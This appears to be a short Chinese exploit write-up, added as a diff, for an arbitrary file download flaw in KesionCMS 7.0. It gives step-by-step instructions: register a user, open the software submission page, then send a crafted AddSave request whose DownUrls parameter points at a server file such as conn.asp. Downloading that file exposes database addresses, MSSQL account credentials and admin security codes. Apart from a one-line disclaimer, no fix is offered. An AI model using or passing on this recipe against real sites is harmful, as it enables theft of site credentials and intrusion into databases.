@@ -1,0 +1,18 @@
+kesioncms7.0最新版本任意下载漏洞
+
+版本：90sec
+ 说明：请用于漏洞安全测试，请勿非法利用
+ 修复方案：我想官方会懂的
+ 
+漏洞检测方法：
+ 先注册个用户登陆，然后访问http://www.xxx.net/user/Contributor.asp 可以看到几个可以投稿的分类，选择个软件投稿.点下一步！
+ 
+然后会跳到：www.2cto.com /user/User_MySoftWare.asp?action=Add&channelid=3&ClassID=20102479005271（这个ClassID不同的站可能会不一样）
+ 
+然后在把地址输入：www.2cto.com /user/User_MySoftWare.asp?action=AddSave&channelid=3&ClassID=20102479005271（上面的ClassID）&Title=aa&DownUrls=/admin63.net.asp（要下载的文件路径。）
+ 
+输入好后就会发布一个标题为aa的软件投稿可以在www.2cto.com /user/User_ItemInfo.asp?ChannelID=3 看到 发布的投稿。
+ 
+打开发布的aa投稿，然后会出现下载截面直接点下载就可以下载到conn.asp这个文件了，一般数据库地址，或者mssql 数据帐户 后台安全码等等 都会记录在里面！
+ 
+由于时间晚了，我就随便说下咯，大概利用就是刚才我说的那样，漏洞放手里半年了，有兴趣的可以去研究下 
